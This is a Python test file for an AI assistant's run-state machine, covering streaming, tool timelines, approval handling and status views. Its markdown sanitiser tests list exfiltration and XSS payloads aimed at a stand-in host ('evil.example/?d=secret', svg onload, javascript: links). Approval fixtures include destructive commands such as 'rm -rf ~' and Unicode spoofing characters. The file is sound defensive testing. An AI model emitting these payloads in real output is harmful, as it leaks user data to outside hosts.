"""Assistant run state machine (docs/ASSISTANT_WORKBENCH.md).

services/assistantrun.js is pure JS, so every transition runs under
node against real NDJSON frames as horneroctl emits them: typed
run/approval/clarify frames, trace frames, the final CommandResult.
Covers race safety (stale process generations), process death,
cancel, pending-request persistence and the honest status view.
"""
import json
import shutil
import subprocess
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
JS = ROOT / "services" / "assistantrun.js"


def run_js(driver: str):
    node = shutil.which("node")
    assert node, "node is required to execute the pure-JS run state machine"
    src = JS.read_text().replace(".pragma library", "", 1)
    proc = subprocess.run([node, "-e", src + "\n" + driver], capture_output=True, text=True, timeout=30)
    assert proc.returncode == 0, proc.stderr
    return json.loads(proc.stdout)


def replay(lines, **opts):
    return run_js(f"console.log(JSON.stringify(replay({json.dumps(lines)}, {json.dumps(opts)})));")


def j(**kw):
    return json.dumps(kw)


def final(ok=True, message="", **data):
    return j(command="assistant ask", ok=ok, message=message, data={k: str(v) for k, v in data.items()})


def test_happy_stream_completes_with_text_and_run_id_first():
    out = replay([
        j(type="run", text="run_1"),
        j(type="delta", text="Hola "),
        j(type="delta", text="mundo"),
        final(True, "ok", runId="run_1"),
    ])
    st = out["state"]
    assert st["phase"] == "completed"
    assert st["runId"] == "run_1"
    assert st["text"] == "Hola mundo"
    assert out["intents"][-1]["intent"] == "success"


def test_run_id_is_known_before_any_text_so_stop_can_be_server_side():
    out = replay([j(type="run", text="run_early")], exit=False)
    assert out["state"]["runId"] == "run_early"
    assert out["state"]["phase"] == "starting"


def test_tool_lifecycle_builds_timeline_and_acting_intent():
    out = replay([
        j(type="run", text="r"),
        j(type="tool", text="▸ terminal: ls -la"),
        j(type="tool", text="✓ terminal"),
        j(type="delta", text="done"),
        final(True, "done", runId="r"),
    ])
    tools = [e for e in out["state"]["timeline"] if e["kind"] == "tool"]
    assert len(tools) == 1 and tools[0]["status"] == "ok" and tools[0]["name"] == "terminal"
    names = [i["intent"] for i in out["intents"]]
    assert "acting" in names and names[-1] == "success"


def test_tool_failure_is_recorded_and_not_success_of_the_tool():
    out = replay([j(type="tool", text="▸ browser"), j(type="tool", text="✗ browser"), final(True, "x", runId="r")])
    tl = out["state"]["timeline"]
    assert tl[0]["status"] == "failed"


def test_live_approval_frame_awaits_and_never_auto_decides():
    out = replay([j(type="run", text="run_2"), j(type="approval", text="pacman -S x")], exit=False)
    st = out["state"]
    assert st["phase"] == "awaiting-approval"
    assert st["pending"]["kind"] == "approval" and st["pending"]["runId"] == "run_2"
    assert st["pending"]["detail"] == "pacman -S x"
    assert out["intents"][-1]["intent"] == "attention"


def test_exit_with_pending_keeps_request_answerable_but_marks_stream_closed():
    out = replay([
        j(type="run", text="run_3"),
        j(type="approval", text="rm -r x"),
        final(False, "waiting", runId="run_3", pending="approval", detail="rm -r x", choices="once,deny"),
    ])
    st = out["state"]
    assert st["phase"] == "awaiting-approval"
    assert st["pending"]["live"] is False
    assert st["pending"]["choices"] == ["once", "deny"]
    assert st["streamClosed"] is True


def test_final_pending_payload_alone_is_enough_without_live_frame():
    out = replay([final(False, "waiting", runId="run_4", pending="approval", detail="x")])
    assert out["state"]["phase"] == "awaiting-approval"
    assert out["state"]["pending"]["runId"] == "run_4"


def test_clarify_pending_roundtrip():
    out = replay([j(type="run", text="r5"), j(type="clarify", text="which theme?")], exit=False)
    assert out["state"]["phase"] == "awaiting-clarification"
    assert out["state"]["pending"]["detail"] == "which theme?"


def test_denied_by_mode_is_blocked_not_failed():
    out = replay([final(False, "denied by ask mode", runId="r6", pending="denied-by-mode", detail="rm")])
    assert out["state"]["phase"] == "blocked"
    assert out["intents"][-1]["intent"] == "denied"


def test_process_death_without_result_is_disconnected_and_clears_activity():
    out = replay([j(type="run", text="r7"), j(type="tool", text="▸ terminal: sleep 99"), j(type="delta", text="par")], code=137)
    st = out["state"]
    assert st["phase"] == "disconnected"
    assert st["activeTools"] == 0
    assert all(e["status"] != "running" for e in st["timeline"] if e["kind"] == "tool")
    assert st["pending"] is None
    assert out["intents"][-1]["intent"] == "error"


def test_failed_result_is_failed_with_message():
    out = replay([final(False, "Cannot reach the Hermes gateway")])
    assert out["state"]["phase"] == "failed"
    assert "gateway" in out["state"]["error"]


def test_cancel_then_exit_is_cancelled_even_if_exit_code_nonzero():
    out = run_js("""
      let s = initial(); let r = reduce(s,{type:'begin',mode:'agent'}); s=r.state;
      r = reduce(s,{type:'line',seq:s.seq,line:JSON.stringify({type:'run',text:'r8'})}); s=r.state;
      r = reduce(s,{type:'cancel'}); s=r.state;
      const mid = s.phase;
      r = reduce(s,{type:'exit',seq:s.seq,code:143}); s=r.state;
      console.log(JSON.stringify({mid, phase:s.phase, intent:r.intents[r.intents.length-1].intent}));
    """)
    assert out == {"mid": "cancelling", "phase": "cancelled", "intent": "rest"}


def test_stale_generation_events_are_dropped():
    out = run_js("""
      let s = initial(); let r = reduce(s,{type:'begin'}); s=r.state; const old=s.seq;
      r = reduce(s,{type:'cancel'}); s=r.state;
      r = reduce(s,{type:'begin'}); s=r.state;           // newer run
      r = reduce(s,{type:'line',seq:old,line:JSON.stringify({type:'delta',text:'LATE'})}); s=r.state;
      r = reduce(s,{type:'exit',seq:old,code:1}); s=r.state;
      console.log(JSON.stringify({phase:s.phase,text:s.text,seq:s.seq,old}));
    """)
    assert out["phase"] == "starting" and out["text"] == "" and out["seq"] == out["old"] + 1


def test_unknown_typed_frames_are_ignored_not_taken_as_final():
    out = replay([j(type="future.thing", text="x"), j(type="delta", text="a"), final(True, "a", runId="r")])
    assert out["state"]["phase"] == "completed" and out["state"]["text"] == "a"


def test_malformed_lines_never_throw():
    out = replay(["{oops", "", "   ", "null", "[1]", j(type="delta", text="ok"), final(True, "ok")])
    assert out["state"]["text"] == "ok" and out["state"]["phase"] == "completed"


def test_pending_survives_trace_lines_but_answer_text_clears_it():
    out = run_js("""
      let s = initial(); let r = reduce(s,{type:'begin'}); s=r.state; const q=s.seq;
      const L = o => { r = reduce(s,{type:'line',seq:q,line:JSON.stringify(o)}); s=r.state; };
      L({type:'run',text:'r9'}); L({type:'approval',text:'x'}); L({type:'tool',text:'\\u25b8 terminal'});
      const stillPending = s.pending !== null && s.phase==='awaiting-approval';
      L({type:'delta',text:'moved on'});
      console.log(JSON.stringify({stillPending, after:s.phase, pending:s.pending}));
    """)
    assert out["stillPending"] is True and out["after"] == "streaming" and out["pending"] is None


def test_decision_success_resumes_and_failure_keeps_request_with_error():
    out = run_js("""
      let s = initial(); let r = reduce(s,{type:'begin'}); s=r.state; const q=s.seq;
      r = reduce(s,{type:'line',seq:q,line:JSON.stringify({type:'run',text:'r10'})}); s=r.state;
      r = reduce(s,{type:'line',seq:q,line:JSON.stringify({type:'approval',text:'x'})}); s=r.state;
      r = reduce(s,{type:'decision',ok:false,message:'HTTP 409'}); s=r.state;
      const keep = {phase:s.phase, err:s.pending.error};
      r = reduce(s,{type:'decision',ok:true}); s=r.state;
      console.log(JSON.stringify({keep, phase:s.phase, pending:s.pending}));
    """)
    assert out["keep"] == {"phase": "awaiting-approval", "err": "HTTP 409"}
    assert out["phase"] == "starting" and out["pending"] is None


def test_denied_decision_uses_denied_intent():
    out = run_js("""
      let s = initial(); let r = reduce(s,{type:'begin'}); s=r.state;
      r = reduce(s,{type:'line',seq:s.seq,line:JSON.stringify({type:'approval',text:'x'})}); s=r.state;
      r = reduce(s,{type:'decision',ok:true,denied:true});
      console.log(JSON.stringify(r.intents));
    """)
    assert out == [{"intent": "denied"}]


def test_text_and_timeline_are_capped():
    big = "x" * 40000
    out = replay([j(type="delta", text=big)] + [j(type="commentary", text=f"c{i}") for i in range(300)] + [final(True, "ok")])
    assert len(out["state"]["text"]) <= 32768
    assert len(out["state"]["timeline"]) <= 200


def test_intent_mapping_is_cosmetic_only():
    out = run_js("console.log(JSON.stringify(['rest','thinking','speaking','acting','attention','success','denied','error','listening','bogus'].map(intentToState)));")
    assert out == ["idle", "thinking", "thinking", "acting", "warning", "success", "denied", "error", "listening", "idle"]
    code = "\n".join(l for l in JS.read_text().splitlines() if not l.strip().startswith("//"))
    for forbidden in ("approve(", "Process", "Quickshell", "execDetached", "import "):
        assert forbidden not in code


def test_gateway_view_and_status_priority():
    out = run_js("""
      const ok = {ok:true,message:'x',data:{enabled:'true',gateway:'reachable',protocol:'compatible',isolation:'bubblewrap'}};
      const unsb = {ok:true,message:'x',data:{enabled:'true',gateway:'reachable',protocol:'compatible',isolation:'systemd-only (not sandboxed)'}};
      const down = {ok:false,message:'x',data:{enabled:'true',gateway:'unreachable'}};
      const off = {ok:true,message:'x',data:{enabled:'false'}};
      const inc = {ok:false,message:'x',data:{enabled:'true',gateway:'reachable',protocol:'incompatible'}};
      const v = p => gatewayView(p);
      const run = ph => ({phase:ph});
      console.log(JSON.stringify({
        ok: statusKey(v(ok), run('idle')),
        unsb: statusKey(v(unsb), run('idle')),
        down: statusKey(v(down), run('streaming')),
        off: statusKey(v(off), run('idle')),
        inc: statusKey(v(inc), run('idle')),
        run: statusKey(v(ok), run('streaming')),
        appr: statusKey(v(ok), run('awaiting-approval')),
        blocked: statusKey(v(ok), run('blocked')),
        failed: statusKey(v(ok), run('disconnected')),
        nullp: v(null).connection,
        sandboxed: v(ok).sandboxed, notSandboxed: v(unsb).sandboxed
      }));
    """)
    assert out == {
        "ok": "connected", "unsb": "degraded-isolation", "down": "disconnected", "off": "disabled",
        "inc": "degraded", "run": "running", "appr": "awaiting-approval", "blocked": "blocked",
        "failed": "failed", "nullp": "disconnected", "sandboxed": True, "notSandboxed": False,
    }


# --- fake-backend harness: real process, real NDJSON, real exit codes -----

import os
import sys
import tempfile

FAKE = ROOT / "tests" / "fixtures" / "fake-horneroctl.py"


def run_fake(scenario, tmp_path, *extra):
    env = dict(os.environ, FAKE_HORNEROCTL_DIR=str(tmp_path))
    (tmp_path / "scenario").write_text(scenario)
    proc = subprocess.run([sys.executable, str(FAKE), "assistant", "ask", "hi", "--json", "--stream", "--mode", "agent", *extra], capture_output=True, text=True, timeout=30, env=env)
    return [line for line in proc.stdout.splitlines() if line.strip()], proc.returncode


def test_fake_stream_scenario_completes(tmp_path):
    lines, code = run_fake("stream", tmp_path)
    out = replay(lines, code=code)
    st = out["state"]
    assert st["phase"] == "completed" and "3 updates" in st["text"]
    assert [e["name"] for e in st["timeline"] if e["kind"] == "tool"] == ["system_info"]
    assert st["runId"].startswith("run_fake_")


def test_fake_approval_closed_scenario_stays_answerable(tmp_path):
    lines, code = run_fake("approval-closed", tmp_path)
    st = replay(lines, code=code)["state"]
    assert st["phase"] == "awaiting-approval"
    assert st["pending"]["detail"] == "rm -r ./build" and st["pending"]["runId"] == st["runId"]
    assert st["pending"]["live"] is False


def test_fake_clarify_blocked_fail_death_scenarios(tmp_path):
    assert replay(*[run_fake("clarify", tmp_path)[0]], code=1)["state"]["phase"] == "awaiting-clarification"
    assert replay(run_fake("blocked", tmp_path)[0], code=1)["state"]["phase"] == "blocked"
    assert replay(run_fake("fail", tmp_path)[0], code=1)["state"]["phase"] == "failed"
    lines, code = run_fake("death", tmp_path)
    assert code != 0
    st = replay(lines, code=code)["state"]
    assert st["phase"] == "disconnected" and st["activeTools"] == 0 and st["text"].endswith("ans")


def test_fake_status_views(tmp_path):
    env = dict(os.environ, FAKE_HORNEROCTL_DIR=str(tmp_path))
    seen = {}
    for g in ("connected", "disconnected", "disabled", "unsandboxed", "incompatible"):
        (tmp_path / "gateway").write_text(g)
        proc = subprocess.run([sys.executable, str(FAKE), "assistant", "status", "--json"], capture_output=True, text=True, timeout=30, env=env)
        payload = json.loads(proc.stdout)
        seen[g] = run_js(f"console.log(JSON.stringify(statusKey(gatewayView({json.dumps(payload)}), {{phase:'idle'}})));")
    assert seen == {"connected": "connected", "disconnected": "disconnected", "disabled": "disabled", "unsandboxed": "degraded-isolation", "incompatible": "degraded"}


BYPASS_INPUTS = [
    "![a](http://evil.example/?d=secret)",
    "![a][r]\n\n[r]: http://evil.example/x.png",
    "<img src=http://evil.example/x.png>",
    "<IMG SRC=http://evil.example/x.png>",
    "< img src=x>",
    "<<img src=x>>",
    "\\<img src=x>",
    "\\![a](http://evil.example/x)",
    "!\\[a](http://evil.example/x)",
    "<img\nsrc=http://evil.example/x>",
    "<svg onload=alert(1)>",
    "<a href='javascript:alert(1)'>x</a>",
    "<iframe src=http://evil.example></iframe>",
    "<![CDATA[ x ]]>",
    "<!-- c --><img src=x>",
    "&lt;img src=x&gt;",
    "![a](<http://evil.example/x y>)",
    "text ![](data:image/png;base64,AAAA) more",
    "<http://evil.example/autolink>",
    "[r]: http://evil.example/x.png",
    "  [r]: http://evil.example/x.png",
]


def test_markdown_bypass_inputs_never_leave_html_or_image_syntax():
    out = run_js("const I=%s; console.log(JSON.stringify(I.map(safeMarkdown)));" % json.dumps(BYPASS_INPUTS))
    for src, res in zip(BYPASS_INPUTS, out):
        assert "<" not in res, (src, res)
        assert "![" not in res, (src, res)
        assert not res.lstrip().startswith("[r]:"), (src, res)


def test_markdown_fuzz_never_produces_markup_that_can_load():
    alphabet = ["<", ">", "!", "[", "]", "(", ")", "&", "\\", "\n", " ", "img", "src=", "http://e/x", "r", ":", "#", "`"]
    out = run_js("""
      const A=%s;
      let seed=12345; const rnd=()=> (seed=(seed*1103515245+12345)&0x7fffffff)/0x7fffffff;
      let bad=0;
      for (let i=0;i<4000;i++){ let t=''; const n=1+Math.floor(rnd()*40); for(let j=0;j<n;j++) t+=A[Math.floor(rnd()*A.length)];
        const r=safeMarkdown(t); if (r.indexOf('<')!==-1 || r.indexOf('![')!==-1) bad++; }
      console.log(JSON.stringify({bad}));
    """ % json.dumps(alphabet))
    assert out == {"bad": 0}


def test_markdown_is_linear_and_capped():
    out = run_js("""
      const big = '![['.repeat(60000) + '<'.repeat(60000) + '['.repeat(200000);
      const t0 = Date.now(); const r = safeMarkdown(big); const dt = Date.now()-t0;
      const t1 = Date.now(); for (let i=0;i<50;i++) safeMarkdown('a ![x](u) <b> '.repeat(1000)); const dt2 = Date.now()-t1;
      console.log(JSON.stringify({dt, dt2, len: r.length, ok: markdownOk(big), small: markdownOk('x')}));
    """)
    assert out["dt"] < 500 and out["dt2"] < 2000
    assert out["len"] <= 20000 and out["ok"] is False and out["small"] is True


def test_links_open_only_as_web_pages():
    out = run_js("console.log(JSON.stringify([isSafeLink('https://example.org/x'), isSafeLink('http://a.b'), isSafeLink('file:///etc/passwd'), isSafeLink('javascript:alert(1)'), isSafeLink('/rel'), isSafeLink('')]));")
    assert out == [True, True, False, False, False, False]


def test_run_ids_and_request_refs_are_strict_and_bad_run_frames_ignored():
    out = run_js("""
      const ids=['run_1','a.b-c','', '.', '..','a/b','a b','a?x=1','x'.repeat(65),'é'];
      const refs=['p1','p1@12','p1@','p1@x','a/b@1','p1@1234567890123'];
      let s=initial(); let r=reduce(s,{type:'begin'}); s=r.state;
      r=reduce(s,{type:'line',seq:s.seq,line:JSON.stringify({type:'run',text:'../../x'})}); s=r.state;
      console.log(JSON.stringify({ids:ids.map(isValidRunId), refs:refs.map(isValidRequestRef), run:s.runId}));
    """)
    assert out["ids"] == [True, True, False, False, False, False, False, False, False, False]
    assert out["refs"] == [True, True, False, False, False, False]
    assert out["run"] == ""


def test_approval_binds_request_id_mode_and_full_text():
    lines = [j(type="run", text="r1"), j(type="mode", text="agent"), j(type="approval.control", text="p9@2"), j(type="approval", text="rm -r ./x")]
    st = replay(lines, exit=False)["state"]
    p = st["pending"]
    assert p["requestId"] == "p9@2" and p["mode"] == "agent" and p["detail"] == "rm -r ./x"
    assert p["truncated"] is False and p["flagged"] is False


def test_replaced_request_never_merges_and_resets_decision_state():
    out = run_js("""
      let s=initial(); let r=reduce(s,{type:'begin'}); s=r.state; const q=s.seq;
      const L=o=>{ r=reduce(s,{type:'line',seq:q,line:JSON.stringify(o)}); s=r.state; };
      L({type:'run',text:'r1'}); L({type:'mode',text:'agent'});
      L({type:'approval.control',text:'p1@1'}); L({type:'approval',text:'first'});
      r=reduce(s,{type:'decision',ok:false,message:'boom'}); s=r.state;
      const err=s.pending.error;
      L({type:'approval.control',text:'p2@1'}); L({type:'approval',text:'second'});
      console.log(JSON.stringify({err, id:s.pending.requestId, detail:s.pending.detail, e2:s.pending.error, dec:s.pending.deciding}));
    """)
    assert out == {"err": "boom", "id": "p2@1", "detail": "second", "e2": "", "dec": False}


def test_missing_control_leaves_request_unbound_and_unknown_mode_is_flagged():
    st = replay([j(type="run", text="r1"), j(type="mode", text="weird"), j(type="approval", text="x")], exit=False)["state"]
    assert st["pending"]["requestId"] == "" and st["pending"]["mode"] == "unknown"


def test_final_payload_carries_request_and_run_mode():
    out = replay([final(False, "waiting", runId="r2", pending="approval", detail="gateway text", request="p5@3", mode="agent", choices="once,deny")])
    p = out["state"]["pending"]
    assert p["requestId"] == "p5@3" and p["mode"] == "agent" and p["detail"] == "gateway text"


def test_long_request_is_flagged_truncated_not_silently_cut_and_hidden_chars_are_visible():
    big = "A" * 9000
    st = replay([j(type="run", text="r"), j(type="approval", text=big)], exit=False)["state"]
    assert st["pending"]["truncated"] is True and len(st["pending"]["detail"]) <= 8000
    st = replay([j(type="run", text="r"), j(type="approval", text="ls \u202e gnp.exe\u0007\u200b")], exit=False)["state"]
    d = st["pending"]["detail"]
    assert st["pending"]["flagged"] is True
    assert "\u202e" not in d and "\u0007" not in d and "\u200b" not in d
    assert "U+202E" in d and "U+0007" in d and "U+200B" in d


def test_hidden_characters_are_marked_widely():
    cps = [0x00A0, 0x00AD, 0x034F, 0x115F, 0x1680, 0x180E, 0x2000, 0x200A, 0x2028, 0x2029, 0x202F, 0x205F, 0x2800, 0x3000, 0x3164, 0xFE00, 0xFE0F, 0xFEFF, 0x0085, 0xE0001, 0xE0041, 0xE0100, 0x200B, 0x202E, 0x2066]
    out = run_js("""
      const cps=%s; const bad=[];
      for (const cp of cps){ const r=visibleText('a'+String.fromCodePoint(cp)+'b',50); if(!r.flagged || r.text.indexOf('U+')===-1) bad.push(cp); }
      const plain=visibleText('plain text, tab\\there\\nnext',50);
      console.log(JSON.stringify({bad, plainFlag: plain.flagged, plainText: plain.text}));
    """ % json.dumps(cps))
    assert out["bad"] == [] and out["plainFlag"] is False and out["plainText"] == "plain text, tab\there\nnext"


def test_carried_request_id_is_dropped_when_the_text_differs():
    out = run_js("""
      let s=initial(); let r=reduce(s,{type:'begin'}); s=r.state; const q=s.seq;
      const L=o=>{ r=reduce(s,{type:'line',seq:q,line:JSON.stringify(o)}); s=r.state; };
      L({type:'run',text:'r1'}); L({type:'approval.control',text:'p1@1'}); L({type:'approval',text:'ls'});
      const same = s.pending.requestId;
      L({command:'c',ok:false,message:'m',data:{runId:'r1',pending:'approval',detail:'rm -rf ~'}});
      console.log(JSON.stringify({same, after:s.pending.requestId, detail:s.pending.detail}));
    """)
    assert out == {"same": "p1@1", "after": "", "detail": "rm -rf ~"}
    # same text keeps the id
    out = run_js("""
      let s=initial(); let r=reduce(s,{type:'begin'}); s=r.state; const q=s.seq;
      const L=o=>{ r=reduce(s,{type:'line',seq:q,line:JSON.stringify(o)}); s=r.state; };
      L({type:'run',text:'r1'}); L({type:'approval.control',text:'p1@1'}); L({type:'approval',text:'ls'});
      L({command:'c',ok:false,message:'m',data:{runId:'r1',pending:'approval',detail:'ls'}});
      console.log(JSON.stringify(s.pending.requestId));
    """)
    assert out == "p1@1"


def test_deny_failed_is_a_failure_not_a_denial():
    st = replay([j(type="run", text="r"), j(type="deny-failed", text="Could not deny the approval; the run was stopped."), final(False, "Could not deny", runId="r", pending="deny-failed")])["state"]
    assert st["phase"] == "failed" and st["pending"] is None and "deny" in st["error"].lower()
    st = replay([final(False, "Could not deny the approval on run r", runId="r", pending="deny-failed", mode="ask")])["state"]
    assert st["phase"] == "failed"


def test_reference_definitions_in_blockquotes_and_lists_are_dropped():
    out = run_js(r"""
      const t='> [r]: http://e/x\n- [r]: http://e/x\n1. > [r]: http://e/x\n  * [r]: http://e/x\nkeep [r]\n';
      console.log(JSON.stringify(safeMarkdown(t)));
    """)
    assert out == "keep [r]\n"
